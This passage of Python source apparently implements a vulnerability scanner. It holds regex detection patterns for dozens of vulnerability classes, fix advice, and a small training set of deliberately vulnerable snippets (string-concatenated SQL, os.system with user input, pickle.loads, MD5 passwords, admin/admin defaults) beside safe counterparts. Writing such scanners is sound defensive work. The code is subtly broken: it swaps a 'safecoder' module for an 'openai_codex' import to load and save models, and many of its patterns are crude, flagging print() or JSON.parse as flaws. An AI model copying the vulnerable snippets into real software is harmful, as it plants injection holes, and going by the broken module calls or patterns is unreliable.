import os
import re
import ast
import argparse
import logging
from typing import List, Dict, Any, Tuple, Optional, Set
import numpy as np
import pickle
import hashlib
from sklearn.feature_extraction.text import TfidfVectorizer
from sklearn.ensemble import RandomForestClassifier
import openai_codex # Replace safecoder with openai_codex
import datetime
from collections import defaultdict
import random
import xml.dom.minidom
import xml.etree.ElementTree as etree
from werkzeug.utils import secure_filename
import openai_codex
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import base64
# Create our own ValidationError instead of importing from werkzeug
class ValidationError(Exception):
    """Custom validation error class to replace werkzeug's ValidationError"""
    pass

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

class VulnerabilityScanner:
    """
    AI-powered tool to scan code for security vulnerabilities and suggest fixes.
    """
    
    # Common vulnerability patterns
    VULNERABILITY_PATTERNS = {
        'sql_injection': [
            r'execute\s*\(\s*[\'"`].*?\bSELECT\b.*?\+.*?[\'"`]',
            r'execute\s*\(\s*[\'"`].*?\bINSERT\b.*?\+.*?[\'"`]',
            r'execute\s*\(\s*[\'"`].*?\bUPDATE\b.*?\+.*?[\'"`]',
            r'execute\s*\(\s*[\'"`].*?\bDELETE\b.*?\+.*?[\'"`]',
            r'cursor\.execute\s*\([^,]*?%s',
            r'cursor\.execute\s*\(.*?\+.*?\)',
            r'\.execute\s*\(.*?\+.*?\)',
            r'execute\s*\(.*?".*?"\s*\+',
            r'execute\s*\(.*?\'.*?\'\s*\+',
            r'sqlite3.*?execute\s*\(.*?\+.*?\)',
            r'cursor\.executemany\s*\(.*?\+.*?\)',
            r'cursor\.executescript\s*\(.*?\)',
            r'query\s*=.*?\+.*?.*?execute\s*\(.*?query',
            r'mysql.*?query\s*\(.*?\+.*?\)',
            r'WHERE\s+.*?\s*=\s*["\'].*?\+.*?["\']'
        ],
        'command_injection': [
            r'os\.system\s*\([^,]*?\+.*?\)',
            r'os\.system\s*\(.*?input.*?\)',
            r'subprocess\.call\s*\([^,]*?\+.*?\)',
            r'subprocess\.Popen\s*\([^,]*?\+.*?\)',
            r'exec\s*\([^,]*?\+.*?\)',
            r'eval\s*\([^,]*?\+.*?\)',
            r'os.system\(".*?"\s*\+.*?\)',
            r'shell_exec\s*\(.*?\+.*?\)',
            r'Runtime\.getRuntime\(\)\.exec\(.*?\+.*?\)',
            r'child_process\.exec\(.*?\+.*?\)'
        ],
        'xss': [
            r'render\s*\([^,]*?\+.*?\)',
            r'innerHTML\s*=.*?\+.*?',
            r'document\.write\s*\(.*?\+.*?\)',
            r'\.html\s*\(.*?\+.*?\)',
            r'template\s*=.*?<.*>\s*\+.*?\+',
            r'<div>.*?\+.*?</div>',
            r'html.*?\+.*?user',
            r'\.innerHTML\s*=',
            r'\.outerHTML\s*=',
            r'\.insertAdjacentHTML\s*\('
        ],
        'csrf': [
            r'form\s+action.*?method=["\']POST["\'].*?(?!csrf)',
            r'fetch\(.*?method:\s*["\']POST["\'].*?(?!csrf)',
            r'ajax\(.*?type:\s*["\']POST["\'].*?(?!csrf)',
            r'XMLHttpRequest.*?\.open\(["\']POST["\']'
        ],
        'insecure_deserialization': [
            r'pickle\.loads\s*\(',
            r'yaml\.load\s*\([^,]*?Loader=None',
            r'yaml\.load\s*\([^,]*?Loader=yaml\.Loader',
            r'marshal\.loads\s*\(',
            r'unserialize\s*\(',
            r'ObjectInputStream',
            r'readObject\s*\(',
            r'JSON\.parse\s*\('
        ],
        'buffer_overflow': [
            r'strcpy\s*\(',
            r'strcat\s*\(',
            r'memcpy\s*\(.*?,.*?,\s*sizeof\(',
            r'gets\s*\(',
            r'sprintf\s*\(',
            r'vsprintf\s*\(',
            r'scanf\s*\(["\'].*?[^l]%s'
        ],
        'path_traversal': [
            r'open\s*\([^,]*?\+.*?\)',
            r'open\s*\(.*?input.*?\)',
            r'os\.path\.join\s*\([^,]*?\.\..*?\)',
            r'file_get_contents\s*\([^,]*?\+.*?\)',
            r'with\s+open\s*\(.*?\+.*?\)',
            r'with\s+open\s*\(.*?input.*?\)',
            r'readFile\s*\(.*?\+.*?\)',
            r'include\s*\(.*?\+.*?\)',
            r'require\s*\(.*?\+.*?\)'
        ],
        'ldap_injection': [
            r'ldap.*?search\s*\(.*?\+.*?\)',
            r'ldap.*?filter\s*=.*?\+.*?\)',
            r'ldap.*?bind\s*\(.*?\+.*?\)',
            r'ldapQuery\s*\(.*?\+.*?\)'
        ],
        'xxe': [
            r'DocumentBuilder.*?parse\s*\(',
            r'SAXParser.*?parse\s*\(',
            r'XMLReader.*?parse\s*\(',
            r'libxml_disable_entity_loader\s*\(\s*false\s*\)',
            r'loadXML\s*\(.*?,.*?LIBXML_NOENT\)'
        ],
        'broken_authentication': [
            r'password.*?==.*?',
            r'password\s*!=.*?',
            r'app\.use\s*\(.*?session.*?secret:\s*["\'][^"\']+["\']\s*\)',
            r'hardcoded.*?password',
            r'password.*?hardcoded',
            r'default.*?password'
        ],
        'session_hijacking': [
            r'session.*?cookie.*?secure\s*:\s*false',
            r'session.*?cookie.*?httpOnly\s*:\s*false',
            r'Set-Cookie.*?(?!Secure)',
            r'Set-Cookie.*?(?!HttpOnly)'
        ],
        'privilege_escalation': [
            r'sudo\s*\(',
            r'setuid\s*\(',
            r'runAs\s*\(',
            r'su\s*\-c\s*\(',
            r'chmod\s*\(\s*[\'"]777[\'"]'
        ],
        'insecure_password_storage': [
            r'password.*?=.*?["\'][^"\']+["\']',
            r'password.*?=.*?md5\s*\(',
            r'password.*?=.*?sha1\s*\(',
            r'password.*?=.*?hash\s*\('
        ],
        'hard_coded_credentials': [
            r'password\s*=\s*[\'"`][^\'"]+[\'"`]',
            r'api_key\s*=\s*[\'"`][^\'"]+[\'"`]',
            r'secret\s*=\s*[\'"`][^\'"]+[\'"`]',
            r'token\s*=\s*[\'"`][^\'"]+[\'"`]',
            r'auth.*?key.*?=.*?["\'][^"\']+["\']',
            r'access.*?key.*?=.*?["\'][^"\']+["\']'
        ],
        'sensitive_data_exposure': [
            r'\.log\s*\(.*?password.*?\)',
            r'\.log\s*\(.*?auth.*?\)',
            r'console\.log\s*\(.*?secret.*?\)',
            r'print\s*\(.*?password.*?\)',
            r'print\s*\(.*?credit.*?card.*?\)',
            r'print\s*\(.*?ssn.*?\)',
            r'return.*?password'
        ],
        'weak_cryptography': [
            r'md5\s*\(',
            r'hashlib\.md5\s*\(',
            r'hashlib\.sha1\s*\(',
            r'random\.',
            r'Math\.random\s*\(',
            r'DES\s*\(',
            r'RC4\s*\(',
            r'Cipher\(.*?DES',
            r'Cipher\(.*?RC2',
            r'Cipher\(.*?Blowfish'
        ],
        'insecure_data_storage': [
            r'localStorage\.setItem\s*\(.*?password.*?\)',
            r'sessionStorage\.setItem\s*\(.*?sensitive.*?\)',
            r'SharedPreferences.*?\.edit\(\)\.putString\s*\(.*?password.*?\)',
            r'NSUserDefaults.*?setObject:.*?forKey:.*?password'
        ],
        'logging_sensitive_data': [
            r'log\s*\(.*?password.*?\)',
            r'log\s*\(.*?credit.*?card.*?\)',
            r'log\s*\(.*?ssn.*?\)',
            r'logger\s*\(.*?password.*?\)',
            r'console\.log\s*\(.*?password.*?\)',
            r'System\.out\.println\s*\(.*?password.*?\)'
        ],
        'information_disclosure': [
            r'printStackTrace\s*\(',
            r'error.*?\.toString\s*\(',
            r'response\.write\s*\(.*?error.*?\)',
            r'res\.send\s*\(.*?err.*?\)',
            r'console\.error\s*\(.*?err.*?\)'
        ],
        'open_redirects': [
            r'redirect\s*\(.*?\+.*?\)',
            r'sendRedirect\s*\(.*?\+.*?\)',
            r'Redirect\s*\(.*?request\.param.*?\)',
            r'window\.location\s*=.*?\+.*?'
        ],
        'clickjacking': [
            r'X-Frame-Options.*?DENY',
            r'X-Frame-Options.*?SAMEORIGIN',
            r'frame-ancestors.*?none'
        ],
        'cors_misconfiguration': [
            r'Access-Control-Allow-Origin\s*:\s*\*',
            r'Access-Control-Allow-Credentials\s*:\s*true',
            r'cors\s*\(.*?origin\s*:\s*["\']?\*["\']?\)'
        ],
        'exposed_admin_panels': [
            r'admin.*?route',
            r'/admin.*?password',
            r'admin.*?login.*?bypass',
            r'admin.*?default.*?credentials'
        ],
        'outdated_libraries': [
            r'require\s*\(["\'].*?jquery.*?[\'"]',
            r'<script.*?src=.*?jquery-1\.',
            r'<script.*?src=.*?jquery-2\.',
            r'<script.*?src=.*?angular\.js',
            r'require\s*\(["\'].*?bootstrap@[1-3]'
        ],
        'race_conditions': [
            r'setTimeout\s*\(',
            r'setInterval\s*\(',
            r'\.race\s*\(',
            r'\.then\s*\(.*?\.then\s*\(',
            r'synchronized'
        ],
        'business_logic_errors': [
            r'if\s*\(.*?===\s*["\'][^"\']*["\']\s*\)',
            r'if\s*\(.*?!==\s*["\'][^"\']*["\']\s*\)',
            r'if\s*\(.*?==\s*["\'][^"\']*["\']\s*\)',
            r'if\s*\(.*?!=\s*["\'][^"\']*["\']\s*\)',
            r'else\s*if\s*\(.*?==\s*["\'][^"\']*["\']\s*\)'
        ],
        'resource_consumption': [
            r'while\s*\(.*?true.*?\)',
            r'for\s*\(.*?;.*?;\s*\)',
            r'setTimeout\s*\(.*?,\s*0\s*\)',
            r'setInterval\s*\(.*?,\s*[0-9]\s*\)'
        ],
        'poor_exception_management': [
            r'catch\s*\(.*?\)\s*{\s*\}',
            r'try\s*{\s*.*\s*}\s*catch\s*\(.*?\)\s*{\s*\}',
            r'except\s*:\s*pass',
            r'except\s+Exception\s+as\s+e\s*:\s*pass'
        ],
        'exposed_debug_mode': [
            r'debug\s*=\s*true',
            r'DEBUG\s*=\s*True',
            r'app\.debug\s*=\s*true',
            r'config\s*\[.*?debug.*?\]\s*=\s*true'
        ],
        'default_credentials': [
            r'username\s*=\s*["\']admin["\']',
            r'password\s*=\s*["\']admin["\']',
            r'password\s*=\s*["\']password["\']',
            r'password\s*=\s*["\']123456["\']',
            r'password\s*=\s*["\']root["\']'
        ],
        'missing_security_headers': [
            r'Content-Security-Policy',
            r'X-XSS-Protection',
            r'X-Content-Type-Options',
            r'Strict-Transport-Security',
            r'Referrer-Policy'
        ],
        'unsafe_javascript': [
            r'eval\s*\(',
            r'new\s+Function\s*\(',
            r'setTimeout\s*\(.*?["\'].*?["\'].*?\)',
            r'setInterval\s*\(.*?["\'].*?["\'].*?\)',
            r'document\.write\s*\('
        ],
        'poor_token_handling': [
            r'localStorage\.setItem\s*\(.*?token.*?\)',
            r'sessionStorage\.setItem\s*\(.*?token.*?\)',
            r'document\.cookie\s*=.*?token',
            r'token.*?=.*?Math\.random\s*\('
        ],
        'dom_manipulation': [
            r'\.innerHTML\s*=',
            r'\.outerHTML\s*=',
            r'\.insertAdjacentHTML\s*\(',
            r'\.html\s*\(',
            r'document\.write\s*\('
        ],
        'improper_rate_limiting': [
            r'rate.*?limit.*?none',
            r'rate.*?limit.*?disabled',
            r'rate.*?limit.*?false',
            r'throttling.*?none'
        ],
        'insecure_api_auth': [
            r'api.*?key.*?header',
            r'api.*?key.*?query',
            r'api.*?key.*?param',
            r'basicAuth\s*\('
        ],
        'overprivileged_tokens': [
            r'jwt\.sign\s*\(.*?expiresIn\s*:\s*["\'].*?[ywdhms]["\']',
            r'token.*?expires.*?year',
            r'token.*?expires.*?month',
            r'token.*?expires.*?never'
        ],
        'vulnerable_dependencies': [
            r'npm\s+install\s+.*?--save',
            r'yarn\s+add\s+',
            r'pip\s+install\s+',
            r'gem\s+install\s+'
        ],
        'exposed_dev_tools': [
            r'debugger',
            r'console\.log\s*\(',
            r'alert\s*\(',
            r'\bdebug\b'
        ],
        'debug_logs_production': [
            r'logger\.debug\s*\(',
            r'console\.debug\s*\(',
            r'System\.out\.println\s*\(',
            r'print\s*\('
        ],
        'test_data_leaks': [
            r'test.*?data',
            r'stub.*?data',
            r'mock.*?data',
            r'sample.*?data'
        ],
        'insecure_mobile_comm': [
            r'http://',
            r'\.setSSLSocketFactory\s*\(',
            r'\.setHostnameVerifier\s*\(',
            r'AllowAllHostnameVerifier'
        ],
        'mobile_data_in_backups': [
            r'backupAgent',
            r'allowBackup\s*=\s*["\']true["\']',
            r'NSBackgroundTaskIdentifier',
            r'UIBackgroundTaskIdentifier'
        ],
        'reverse_engineering': [
            r'export\s+const\s+SECRET',
            r'export\s+class\s+Secret',
            r'private\s+static\s+final\s+String\s+SECRET',
            r'obfuscation'
        ],
        'backdoors': [
            r'backdoor',
            r'test.*?debug.*?mode',
            r'hidden.*?admin',
            r'secret.*?access'
        ],
        'accidental_commits': [
            r'-----BEGIN\s+(RSA|DSA|EC|OPENSSH)\s+PRIVATE\s+KEY',
            r'access_key.*?=.*?[A-Za-z0-9/+]{20,}',
            r'secret_key.*?=.*?[A-Za-z0-9/+]{20,}',
            r'password.*?=.*?[A-Za-z0-9/+]{8,}'
        ],
        'copied_insecure_code': [
            r'TODO.*?fix.*?security',
            r'FIXME.*?security',
            r'Copied\s+from\s+',
            r'Based\s+on\s+example',
            r'Stack\s+Overflow'
        ]
    }
    
    # Fix suggestions for each vulnerability type
    FIX_SUGGESTIONS = {
        'sql_injection': [
            "Use parameterized queries with placeholders instead of string concatenation",
            "Example: cursor.execute('SELECT * FROM users WHERE username = ?', (username,))",
            "Consider using an ORM like SQLAlchemy to help prevent SQL injection"
        ],
        'xss': [
            "Sanitize user input before rendering in HTML",
            "Use templating engines with automatic escaping",
            "Consider using Content Security Policy (CSP)"
        ],
        'path_traversal': [
            "Validate and sanitize file paths",
            "Use os.path.abspath() and os.path.normpath() to resolve paths",
            "Consider using path libraries like pathlib that handle path manipulation securely"
        ],
        'command_injection': [
            "Avoid passing user input directly to shell commands",
            "Use subprocess with shell=False and a list of arguments",
            "Example: subprocess.run(['ls', directory], shell=False)"
        ],
        'insecure_deserialization': [
            "Avoid deserializing untrusted data",
            "Use safer alternatives like JSON for data serialization",
            "If using YAML, use yaml.safe_load() instead of yaml.load()"
        ],
        'weak_cryptography': [
            "Use strong hashing algorithms like SHA-256 or SHA-3",
            "For passwords, use specialized algorithms like bcrypt or Argon2",
            "Use cryptographically secure random number generators from secrets module"
        ],
        'hard_coded_credentials': [
            "Store credentials in environment variables",
            "Use a secure secrets management system",
            "Consider using tools like AWS Secrets Manager or HashiCorp Vault"
        ],
        'csrf': [
            "Implement CSRF tokens in all forms and AJAX requests",
            "Validate CSRF tokens on the server side for all state-changing operations",
            "Use SameSite=Strict or SameSite=Lax for cookies",
            "Add the 'Referrer-Policy' header to control referrer information"
        ],
        'buffer_overflow': [
            "Use safe alternatives to unsafe functions (strcpy -> strncpy, gets -> fgets)",
            "Implement proper bounds checking for all memory operations",
            "Consider using memory-safe languages or use tools like AddressSanitizer",
            "Always validate input length before copying to a buffer"
        ],
        'ldap_injection': [
            "Sanitize and validate all input used in LDAP queries",
            "Use LDAP libraries with proper escaping of special characters",
            "Implement input validation for characters like '(', ')', '*', '\\'",
            "Use LDAP bind operations instead of hardcoded credentials"
        ],
        'xxe': [
            "Disable external entity processing in XML parsers",
            "Use secure XML processing libraries",
            "Set the XMLConstants.FEATURE_SECURE_PROCESSING feature to true",
            "Consider using JSON instead of XML where possible"
        ],
        'broken_authentication': [
            "Implement strong password policies",
            "Use multi-factor authentication for sensitive operations",
            "Implement account lockout after failed attempts",
            "Store passwords using strong hashing algorithms like bcrypt or Argon2"
        ],
        'session_hijacking': [
            "Set cookies with the Secure flag to transmit only over HTTPS",
            "Use HttpOnly flag to prevent JavaScript access to cookies",
            "Implement proper session management with timeouts",
            "Regenerate session IDs after login"
        ],
        'privilege_escalation': [
            "Implement proper access controls and role-based permissions",
            "Validate all user permissions for each sensitive operation",
            "Never run with higher privileges than necessary",
            "Implement the principle of least privilege"
        ],
        'insecure_password_storage': [
            "Use specialized password hashing algorithms like bcrypt, Argon2, or PBKDF2",
            "Always include a unique salt for each password hash",
            "Never store plaintext passwords or use weak hashing algorithms like MD5 or SHA-1",
            "Implement a minimum hash iteration count that makes brute-force attacks impractical"
        ],
        'sensitive_data_exposure': [
            "Encrypt all sensitive data at rest and in transit",
            "Implement proper access controls for sensitive data",
            "Remove sensitive data when no longer needed",
            "Avoid logging sensitive information"
        ],
        'insecure_data_storage': [
            "Never store sensitive data in client-side storage like localStorage",
            "Use secure, server-side session storage for sensitive data",
            "Encrypt sensitive data before storing it",
            "Implement proper access controls for data access"
        ],
        'logging_sensitive_data': [
            "Remove all sensitive data from logs (passwords, tokens, PII)",
            "Implement data masking for sensitive fields in logs",
            "Use log levels appropriately to control what is logged",
            "Ensure logs are protected with proper access controls"
        ],
        'information_disclosure': [
            "Implement custom error pages that don't reveal system details",
            "Disable detailed error messages in production",
            "Catch and log exceptions securely without revealing internal details to users",
            "Remove debugging information from production code"
        ],
        'open_redirects': [
            "Implement a whitelist of allowed redirect URLs",
            "Validate all redirect URLs against this whitelist",
            "Use relative URLs for internal redirects",
            "Consider using a redirect mapping table instead of dynamic URLs"
        ],
        'clickjacking': [
            "Implement X-Frame-Options header with DENY or SAMEORIGIN",
            "Use Content-Security-Policy with frame-ancestors directive",
            "Add JavaScript frame-busting code as a backup protection",
            "Consider frame-breaking techniques if needed"
        ],
        'cors_misconfiguration': [
            "Do not use Access-Control-Allow-Origin: * with sensitive data",
            "Specify exact origins in the Access-Control-Allow-Origin header",
            "Do not use Access-Control-Allow-Credentials: true with wildcard origins",
            "Implement proper CORS policy based on the principle of least privilege"
        ],
        'exposed_admin_panels': [
            "Restrict access to admin interfaces using proper authentication",
            "Use IP allowlisting to limit access to admin panels",
            "Place admin interfaces on a separate subdomain with additional protections",
            "Consider using a VPN for access to administrative features"
        ],
        'outdated_libraries': [
            "Implement a dependency management process to keep libraries updated",
            "Use tools like npm audit, OWASP Dependency-Check, or Snyk",
            "Subscribe to security advisories for dependencies",
            "Regularly review and update dependencies in your project"
        ],
        'race_conditions': [
            "Use atomic operations when possible",
            "Implement proper locking mechanisms (mutex, semaphore)",
            "Consider using transactions for critical operations",
            "Design to handle concurrent operations safely"
        ],
        'business_logic_errors': [
            "Implement comprehensive server-side validation",
            "Re-validate business rules on the server regardless of client validation",
            "Implement proper access controls for all business operations",
            "Test all business workflows thoroughly"
        ],
        'resource_consumption': [
            "Implement proper rate limiting for all endpoints",
            "Set timeouts for long-running operations",
            "Limit resource allocation with proper bounds checking",
            "Monitor for abnormal patterns that could indicate DoS attacks"
        ],
        'poor_exception_management': [
            "Catch specific exceptions rather than generic ones",
            "Always handle exceptions appropriately, never catch and ignore",
            "Log exceptions with enough context for debugging",
            "Don't expose exception details to users in production"
        ],
        'exposed_debug_mode': [
            "Ensure debug mode is disabled in production",
            "Remove debug code before deployment",
            "Implement different environment configurations for dev/staging/production",
            "Use environment variables to control debug settings"
        ],
        'default_credentials': [
            "Change all default credentials immediately after installation",
            "Implement a secure credential management system",
            "Enforce strong password policies",
            "Regular audit and rotation of credentials"
        ],
        'missing_security_headers': [
            "Implement Content-Security-Policy header",
            "Add X-XSS-Protection header",
            "Set X-Content-Type-Options: nosniff",
            "Configure Strict-Transport-Security header for HTTPS",
            "Add Referrer-Policy header to control referrer information"
        ],
        'unsafe_javascript': [
            "Avoid eval() and new Function() completely",
            "Use safer alternatives like JSON.parse() instead of eval",
            "Sanitize any data before it's used in JavaScript",
            "Implement Content Security Policy to restrict script execution"
        ],
        'poor_token_handling': [
            "Store tokens in HttpOnly cookies, not localStorage",
            "Implement proper token expiration",
            "Use secure, random token generation",
            "Invalidate tokens on logout and security events"
        ],
        'dom_manipulation': [
            "Use safe DOM methods like textContent instead of innerHTML",
            "Sanitize any data before inserting into the DOM",
            "Consider using libraries with automatic escaping like React",
            "Implement Content Security Policy to mitigate XSS risks"
        ],
        'improper_rate_limiting': [
            "Implement rate limiting for all API endpoints",
            "Use token bucket or leaky bucket algorithms",
            "Apply rate limits based on user, IP, or API key",
            "Provide clear feedback when rate limits are exceeded"
        ],
        'insecure_api_auth': [
            "Use OAuth 2.0 or JWT for API authentication",
            "Never send API keys in URLs",
            "Implement token expiration and rotation",
            "Use HTTPS for all API communication"
        ],
        'overprivileged_tokens': [
            "Follow the principle of least privilege for token scopes",
            "Implement token expiration with reasonable timeframes",
            "Use short-lived tokens with refresh capability",
            "Implement token revocation mechanisms"
        ],
        'vulnerable_dependencies': [
            "Regularly update dependencies to their latest secure versions",
            "Use tools like npm audit, OWASP Dependency-Check, or Snyk",
            "Implement a process for monitoring CVEs in dependencies",
            "Consider using lockfiles to pin known-good versions"
        ],
        'exposed_dev_tools': [
            "Remove debugging tools, comments, and console logs from production code",
            "Implement a build process that strips development artifacts",
            "Use source maps only in development",
            "Disable developer tools in sensitive applications where possible"
        ],
        'debug_logs_production': [
            "Configure appropriate log levels for different environments",
            "Remove detailed debug logs in production",
            "Implement log rotation and archiving",
            "Protect access to log files with proper permissions"
        ],
        'test_data_leaks': [
            "Never use production data in test environments",
            "Sanitize any test data used in development",
            "Remove test accounts and data before deploying to production",
            "Implement data masking for sensitive test data"
        ],
        'insecure_mobile_comm': [
            "Use HTTPS for all mobile communications",
            "Implement certificate pinning to prevent MITM attacks",
            "Verify server certificates properly",
            "Implement proper session management for mobile APIs"
        ],
        'mobile_data_in_backups': [
            "Exclude sensitive data from mobile backups",
            "Use encrypted storage for sensitive information",
            "On Android, set android:allowBackup=\"false\" in the manifest",
            "On iOS, use NSURLIsExcludedFromBackupKey for sensitive files"
        ],
        'reverse_engineering': [
            "Implement code obfuscation for sensitive mobile applications",
            "Use anti-tampering techniques to detect modifications",
            "Store sensitive logic server-side when possible",
            "Implement app signature verification"
        ],
        'backdoors': [
            "Remove all testing backdoors before production deployment",
            "Implement proper access controls for administrative functions",
            "Conduct regular code reviews to identify unauthorized code",
            "Use the principle of least privilege for all code"
        ],
        'accidental_commits': [
            "Use pre-commit hooks to detect sensitive information",
            "Implement secrets scanning in CI/CD pipelines",
            "Use tools like git-secrets to prevent committing secrets",
            "Store secrets in environment variables or secure vaults"
        ],
        'copied_insecure_code': [
            "Review all copied code for security issues",
            "Understand code before using it in your application",
            "Update outdated or insecure code patterns",
            "Consider using vetted libraries instead of copying code snippets"
        ]
    }

    def __init__(self, model_path: Optional[str] = None):
        """
        Initialize the scanner with an optional pre-trained model or create a basic model.
        
        Args:
            model_path: Path to a pre-trained model file
        """
        self.vectorizer = TfidfVectorizer(max_features=1000)
        self.model = RandomForestClassifier(n_estimators=100)
        
        # Try to load existing model
        if model_path and os.path.exists(model_path):
            try:
                self._load_model(model_path)
                logger.info(f"Model loaded from {model_path}")
            except Exception as e:
                logger.warning(f"Failed to load model: {e}")
                logger.info("Using default model")
                self._create_basic_model()
        else:
            logger.info("Creating basic model...")
            self._create_basic_model()
    
    def _create_basic_model(self):
        """Create a basic model with sample vulnerable and non-vulnerable code."""
        # Sample vulnerable code snippets
        vulnerable_samples = [
            # SQL Injection
            """def login(username, password):
                conn = sqlite3.connect('users.db')
                cursor = conn.cursor()
                query = "SELECT * FROM users WHERE username = '" + username + "' AND password = '" + password + "'"
                cursor.execute(query)
                return cursor.fetchone()""",
            
            """def get_user(user_id):
                conn = sqlite3.connect('users.db')
                cursor = conn.cursor()
                cursor.execute("SELECT * FROM users WHERE id = " + user_id)
                return cursor.fetchone()""",
            
            # Command Injection
            """def get_logs(date):
                os.system("cat /var/log/app.log | grep " + date)""",
            
            # XSS
            """def render_profile(user_data):
                template = "<div>Name: " + user_data['name'] + "</div>"
                return template""",
            
            # Path Traversal
            """def read_file(filename):
                with open(user_input + ".txt", "r") as f:
                    return f.read()""",
                    
            # Hard-coded Credentials
            """def store_secret():
                api_key = "12345secret_key_here"
                password = "admin123"
                return encrypt(api_key)""",
                
            # CSRF
            """def process_transfer(request):
                # No CSRF token validation
                amount = request.POST.get('amount')
                destination = request.POST.get('destination')
                transfer_money(amount, destination)
                return "Transfer completed" """,
                
            # Insecure Deserialization
            """def load_user_settings(data):
                return pickle.loads(data)""",
                
            # XXE
            """def parse_xml(xml_string):
                doc = xml.dom.minidom.parseString(xml_string)
                return doc.getElementsByTagName('user')[0].firstChild.nodeValue""",
                
            # Broken Authentication
            """def verify_password(user, password):
                stored_pw = get_password_from_db(user)
                return password == stored_pw  # Direct comparison""",
                
            # Session Hijacking
            """def set_session_cookie(response, session_id):
                response.set_cookie('session', session_id)  # No secure or HttpOnly flags""",
                
            # Weak Cryptography
            """def hash_password(password):
                return hashlib.md5(password.encode()).hexdigest()""",
                
            # Sensitive Data Exposure
            """def process_payment(credit_card, amount):
                print(f"Processing payment with card {credit_card} for ${amount}")
                logger.info(f"Payment processed with card {credit_card}")
                return process_with_gateway(credit_card, amount)""",
                
            # Open Redirects
            """def redirect_after_login(request):
                url = request.GET.get('next')
                return redirect(url)  # No validation""",
                
            # DOM Manipulation without Sanitization
            """function updateUser(userData) {
                document.getElementById('userInfo').innerHTML = userData.info;
            }""",
                
            # CORS Misconfiguration
            """app.use(cors({
                origin: '*',
                credentials: true
            }));""",
                
            # Poor Exception Management
            """try:
                process_data(user_input)
            except Exception:
                pass  # Silently ignore errors""",
                
            # Default Credentials
            """def setup_admin():
                if not admin_exists():
                    create_admin(username="admin", password="admin")""",
                
            # Insecure Direct Object Reference
            """def get_user_document(request, doc_id):
                # No authorization check
                return db.get_document(doc_id)""",
                
            # Unsafe JavaScript
            """function dynamicCode(input) {
                eval('process' + input + '()');
            }"""
        ]
        
        # Sample safe code snippets
        safe_samples = [
            # Safe SQL Query
            """def login(username, password):
                conn = sqlite3.connect('users.db')
                cursor = conn.cursor()
                cursor.execute("SELECT * FROM users WHERE username = ? AND password = ?", (username, password))
                return cursor.fetchone()""",
            
            # Safe Command Execution
            """def get_logs(date):
                subprocess.run(["grep", date, "/var/log/app.log"], shell=False, capture_output=True, text=True)""",
            
            # Safe HTML Rendering
            """def render_profile(user_data):
                import html
                template = f"<div>Name: {html.escape(user_data['name'])}</div>"
                return template""",
            
            # Safe File Access
            """def read_file(filename):
                import os.path
                safe_path = os.path.normpath(os.path.join(safe_dir, filename))
                if not safe_path.startswith(safe_dir):
                    return "Access denied"
                with open(safe_path, "r") as f:
                    return f.read()""",
                    
            # Safe Credential Management
            """def store_secret():
                import os
                api_key = os.environ.get("API_KEY")
                password = os.environ.get("PASSWORD")
                return encrypt(api_key)""",
                
            # CSRF Protection
            """def process_transfer(request):
                if not check_csrf_token(request.POST.get('csrf_token')):
                    return "CSRF validation failed"
                amount = request.POST.get('amount')
                destination = request.POST.get('destination')
                transfer_money(amount, destination)
                return "Transfer completed" """,
                
            # Safe Deserialization
            """def load_user_settings(data):
                return json.loads(data)  # Using JSON instead of pickle""",
                
            # Safe XML Processing
            """def parse_xml(xml_string):
                parser = etree.XMLParser(resolve_entities=False)
                doc = etree.fromstring(xml_string, parser)
                return doc.find('user').text""",
                
            # Secure Password Verification
            """def verify_password(user, password):
                stored_hash = get_password_hash_from_db(user)
                salt = get_salt_from_db(user)
                return hmac.compare_digest(
                    hash_password(password, salt),
                    stored_hash
                )""",
                
            # Secure Session Management
            """def set_session_cookie(response, session_id):
                response.set_cookie(
                    'session', session_id,
                    secure=True,
                    httponly=True,
                    samesite='Lax'
                )""",
                
            # Strong Cryptography
            """def hash_password(password, salt=None):
                if salt is None:
                    salt = os.urandom(32)
                hashed_pw = hashlib.pbkdf2_hmac('sha256', password.encode(), salt, 100000)
                return salt + hashed_pw""",
                
            # Safe Handling of Sensitive Data
            """def process_payment(credit_card, amount):
                masked_card = mask_credit_card(credit_card)
                logger.info(f"Processing payment with card {masked_card}")
                return process_with_gateway(credit_card, amount)""",
                
            # Safe Redirect
            """def redirect_after_login(request):
                url = request.GET.get('next', '')
                if not url.startswith('/') or '//' in url:
                    url = '/default'
                return redirect(url)""",
                
            # Safe DOM Manipulation
            """function updateUser(userData) {
                const userInfo = document.getElementById('userInfo');
                userInfo.textContent = userData.info;  // Using textContent instead of innerHTML
            }""",
                
            # Secure CORS Configuration
            """app.use(cors({
                origin: 'https://example.com',
                credentials: true
            }));""",
                
            # Proper Exception Handling
            """try:
                process_data(user_input)
            except ValidationError as e:
                log_error(f"Validation error: {e}")
                return error_response("Invalid input")
            except Exception as e:
                log_error(f"Unexpected error: {e}")
                return error_response("An error occurred")""",
                
            # Secure Default Settings
            """def setup_admin():
                if not admin_exists():
                    password = generate_strong_password()
                    send_admin_password_email(password)
                    create_admin(username="admin", password=password)""",
                
            # Secure Object Reference
            """def get_user_document(request, doc_id):
                user = get_authenticated_user(request)
                if not user_can_access_document(user, doc_id):
                    return access_denied()
                return db.get_document(doc_id)""",
                
            # Safe JavaScript
            """function dynamicCode(input) {
                const allowedFunctions = {
                    'process1': () => process1(),
                    'process2': () => process2()
                };
                
                if (allowedFunctions[input]) {
                    allowedFunctions[input]();
                }
            }"""
        ]
        
        # Combine samples
        all_samples = vulnerable_samples + safe_samples
        labels = [1] * len(vulnerable_samples) + [0] * len(safe_samples)
        
        # Train basic model
        self.vectorizer.fit(all_samples)
        X = self.vectorizer.transform(all_samples)
        self.model.fit(X, labels)
        logger.info("Basic model trained with sample data including all vulnerability types")
    
    def _load_model(self, model_path: str) -> None:
        """
        Load a pre-trained model.
        
        Args:
            model_path: Path to the model file
        """
        model_data = openai_codex.load(model_path)  # Replace safecoder.load with openai_codex.load
        self.vectorizer = model_data['vectorizer']
        self.model = model_data['model']
    
    def save_model(self, model_path: str) -> None:
        """
        Save the trained model.
        
        Args:
            model_path: Path to save the model file
        """
        model_data = {
            'vectorizer': self.vectorizer,
            'model': self.model
        }
        openai_codex.dump(model_data, model_path)  # Replace safecoder.dump with openai_codex.dump
        logger.info(f"Model saved to {model_path}")
    
    def train(self, code_samples: List[str], labels: List[int]) -> None:
        """
        Train the model with labeled code samples.
        
        Args:
            code_samples: List of code snippets
